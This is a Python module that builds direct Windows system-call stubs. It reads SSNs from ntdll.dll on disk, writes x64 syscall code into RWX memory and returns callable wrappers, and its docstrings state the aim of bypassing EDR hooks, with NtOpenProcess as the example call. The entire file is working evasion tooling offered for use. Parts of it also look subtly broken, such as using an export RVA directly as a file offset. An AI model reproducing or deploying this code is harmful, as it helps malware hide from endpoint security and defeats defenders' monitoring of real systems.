"""
Direct System Call stubs — extracts System Service Numbers (SSN) from
ntdll.dll exports at runtime and invokes the syscall instruction directly,
bypassing any EDR hooks placed in ntdll.
"""
from __future__ import annotations
import ctypes
import ctypes.wintypes
import os
import struct
import sys
from typing import Optional

if sys.platform != "win32":
    raise ImportError("syscall requires Windows")

# ── SSN extraction ────────────────────────────────────────────────────────────

NTDLL_PATH = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32", "ntdll.dll")

def _get_module_base(name: str) -> int:
    return ctypes.windll.kernel32.GetModuleHandleW(name)

def _read_proc_mem(addr: int, size: int) -> Optional[bytes]:
    buf = ctypes.create_string_buffer(size)
    read = ctypes.c_size_t(0)
    ok = ctypes.windll.kernel32.ReadProcessMemory(
        ctypes.windll.kernel32.GetCurrentProcess(),
        ctypes.c_void_p(addr), buf, size, ctypes.byref(read),
    )
    return bytes(buf[:read.value]) if ok else None

def _extract_ssn_from_disk(func_name: str, dll_path: str = NTDLL_PATH) -> Optional[int]:
    """
    Read on-disk ntdll.dll to get the SSN. The stub pattern:
        4C 8B D1       mov r10, rcx
        B8 xx xx 00 00 mov eax, <SSN>
    This reads the on-disk image to avoid inline EDR hooks in memory.
    """
    try:
        with open(dll_path, "rb") as f:
            data = f.read()
    except OSError:
        return None

    exports = _parse_exports(data)
    if func_name not in exports:
        return None

    rva = exports[func_name]
    stub = data[rva:rva + 24]
    # Find "MOV EAX, imm32" (0xB8 + 4-byte SSN) — may be at offset 4 (clean) or shifted by jmp hook
    for offset in range(0, 16):
        if offset + 5 <= len(stub) and stub[offset] == 0xB8:
            ssn = struct.unpack_from("<I", stub, offset + 1)[0]
            if ssn < 0x600:  # sanity — SSNs below 0x600 on all supported Windows
                return ssn
    return None

def _parse_exports(pe_bytes: bytes) -> dict[str, int]:
    exports: dict[str, int] = {}
    try:
        e_lfanew = struct.unpack_from("<I", pe_bytes, 0x3C)[0]
        machine  = struct.unpack_from("<H", pe_bytes, e_lfanew + 4)[0]
        is64     = machine == 0x8664
        opt_off  = e_lfanew + 24
        dd_off   = opt_off + (112 if is64 else 96)
        exp_rva  = struct.unpack_from("<I", pe_bytes, dd_off)[0]
        if exp_rva == 0:
            return exports
        num_sections = struct.unpack_from("<H", pe_bytes, e_lfanew + 6)[0]
        sh_off = opt_off + struct.unpack_from("<H", pe_bytes, e_lfanew + 20)[0]

        def r2o(rva: int) -> int:
            for i in range(num_sections):
                s   = sh_off + i * 40
                va  = struct.unpack_from("<I", pe_bytes, s + 12)[0]
                vsz = struct.unpack_from("<I", pe_bytes, s + 16)[0]
                raw = struct.unpack_from("<I", pe_bytes, s + 20)[0]
                if va <= rva < va + vsz:
                    return raw + (rva - va)
            return rva

        eoff     = r2o(exp_rva)
        nfuncs   = struct.unpack_from("<I", pe_bytes, eoff + 20)[0]
        nnames   = struct.unpack_from("<I", pe_bytes, eoff + 24)[0]
        addr_tbl = r2o(struct.unpack_from("<I", pe_bytes, eoff + 28)[0])
        name_tbl = r2o(struct.unpack_from("<I", pe_bytes, eoff + 32)[0])
        ord_tbl  = r2o(struct.unpack_from("<I", pe_bytes, eoff + 36)[0])

        for i in range(nnames):
            n_rva = struct.unpack_from("<I", pe_bytes, name_tbl + i * 4)[0]
            n_off = r2o(n_rva)
            end   = pe_bytes.index(b"\x00", n_off)
            name  = pe_bytes[n_off:end].decode("ascii", errors="replace")
            ordi  = struct.unpack_from("<H", pe_bytes, ord_tbl + i * 2)[0]
            if ordi < nfuncs:
                func_rva = struct.unpack_from("<I", pe_bytes, addr_tbl + ordi * 4)[0]
                exports[name] = func_rva
    except Exception:
        pass
    return exports

# ── Stub builder ──────────────────────────────────────────────────────────────

def _build_syscall_stub(ssn: int) -> bytes:
    """
    Build a minimal syscall stub in x64 machine code:
        4C 8B D1            mov r10, rcx
        B8 xx xx 00 00      mov eax, <SSN>
        0F 05               syscall
        C3                  ret
    """
    return (
        b"\x4C\x8B\xD1"                          # mov r10, rcx
        + b"\xB8" + struct.pack("<I", ssn)        # mov eax, ssn
        + b"\x0F\x05"                             # syscall
        + b"\xC3"                                 # ret
    )

def _alloc_exec(data: bytes) -> int:
    """Allocate RWX memory and write the stub. Returns pointer or 0."""
    k32  = ctypes.windll.kernel32
    size = len(data)
    MEM_COMMIT   = 0x1000
    MEM_RESERVE  = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    addr = k32.VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not addr:
        return 0
    ctypes.memmove(addr, data, size)
    return addr

# ── DirectSyscall class ───────────────────────────────────────────────────────

class DirectSyscall:
    """
    Provides callable wrappers for NT syscalls that bypass ntdll hooks.
    Usage:
        sc = DirectSyscall()
        NtOpenProcess = sc.get("NtOpenProcess")
        status = NtOpenProcess(...)  # calls syscall directly
    """

    def __init__(self, dll_path: str = NTDLL_PATH) -> None:
        self._dll_path = dll_path
        self._ssn_cache: dict[str, int]      = {}
        self._stub_cache: dict[str, ctypes.CFUNCTYPE] = {}  # type: ignore[type-arg]

    def get_ssn(self, func_name: str) -> Optional[int]:
        if func_name in self._ssn_cache:
            return self._ssn_cache[func_name]
        ssn = _extract_ssn_from_disk(func_name, self._dll_path)
        if ssn is not None:
            self._ssn_cache[func_name] = ssn
        return ssn

    def get(self, func_name: str) -> Optional[ctypes.CFUNCTYPE]:  # type: ignore[type-arg]
        """Return a ctypes-callable function pointer for the named syscall."""
        if func_name in self._stub_cache:
            return self._stub_cache[func_name]

        ssn = self.get_ssn(func_name)
        if ssn is None:
            return None

        stub_bytes = _build_syscall_stub(ssn)
        addr = _alloc_exec(stub_bytes)
        if not addr:
            return None

        FUNCTYPE = ctypes.CFUNCTYPE(ctypes.c_long)
        fn = FUNCTYPE(addr)
        self._stub_cache[func_name] = fn
        return fn

    def dump_ssns(self, prefixes: tuple[str, ...] = ("Nt", "Zw")) -> dict[str, int]:
        """Parse all Nt/Zw exports from disk and return their SSNs."""
        try:
            with open(self._dll_path, "rb") as f:
                data = f.read()
        except OSError:
            return {}
        exports = _parse_exports(data)
        result: dict[str, int] = {}
        for name, rva in exports.items():
            if not any(name.startswith(p) for p in prefixes):
                continue
            stub = data[rva:rva + 24]
            for off in range(0, 16):
                if off + 5 <= len(stub) and stub[off] == 0xB8:
                    ssn = struct.unpack_from("<I", stub, off + 1)[0]
                    if ssn < 0x600:
                        result[name] = ssn
                        break
        return result

    def print_ssn_table(self) -> None:
        table = self.dump_ssns()
        print(f"\n[SYSCALL] SSN table from {self._dll_path} ({len(table)} entries)\n")
        for name, ssn in sorted(table.items(), key=lambda x: x[1]):
            print(f"  SSN 0x{ssn:04X}  {name}")
